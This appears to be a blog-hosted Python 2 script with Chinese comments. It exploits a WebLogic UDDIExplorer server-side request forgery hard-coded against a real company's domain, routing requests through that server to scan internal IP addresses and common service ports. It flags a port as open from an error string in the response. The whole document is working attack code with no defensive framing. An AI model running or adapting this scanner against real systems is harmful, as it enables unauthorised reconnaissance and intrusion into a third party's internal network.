<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(ip_str)</span>:</span></div><div class="line"><span class="comment">#元组</span></div><div class="line">ports = (<span class="string">'21'</span>,<span class="string">'22'</span>,<span class="string">'23'</span>,<span class="string">'53'</span>,<span class="string">'80'</span>,<span class="string">'135'</span>,<span class="string">'139'</span>,<span class="string">'443'</span>,<span class="string">'445'</span>,<span class="string">'1080'</span>,<span class="string">'1433'</span>,<span class="string">'1521'</span>,<span class="string">'3306'</span>,<span class="string">'3389'</span>,<span class="string">'4899'</span>,<span class="string">'8080'</span>,<span class="string">'7001'</span>,<span class="string">'8000'</span>,)</div><div class="line"></div><div class="line"><span class="keyword">for</span> port <span class="keyword">in</span> ports:</div><div class="line"><span class="comment"># %d 是整形通配符,%s是字符串通配符</span></div><div class="line">exp_url = <span class="string">"http://www.faw.com.cn/uddiexplorer/SetupUDDIExplorer.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search"</span>%(ip_str,port)</div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"></div><div class="line">response = requests.get(exp_url, timeout=<span class="number">1</span>, verify=<span class="keyword">False</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'weblogic.uddi.client.structures.exception.XML_SoapException'</span> <span class="keyword">in</span> response.content:</div><div class="line"></div><div class="line"><span class="keyword">print</span> ip_str+<span class="string">':'</span> + port + <span class="string">' --open'</span></div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception, e:</div><div class="line"></div><div class="line"><span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_ip</span><span class="params">(ip_prefix)</span>:</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">190</span>,<span class="number">200</span>):</div><div class="line"></div><div class="line">scan(<span class="string">'%s.%s'</span>%(ip_prefix,i))</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">commandargs = sys.argv[<span class="number">1</span>]</div><div class="line"></div><div class="line">args = <span class="string">""</span>.join(commandargs)<span class="comment">#将列表数据以‘’中的字符链接</span></div><div class="line"></div><div class="line">ip_prefix = <span class="string">'.'</span>.join(args.split(<span class="string">'.'</span>)[:<span class="number">-1</span>])</div><div class="line"></div><div class="line">find_ip(ip_prefix)</div></pre></td></tr></table></figure>
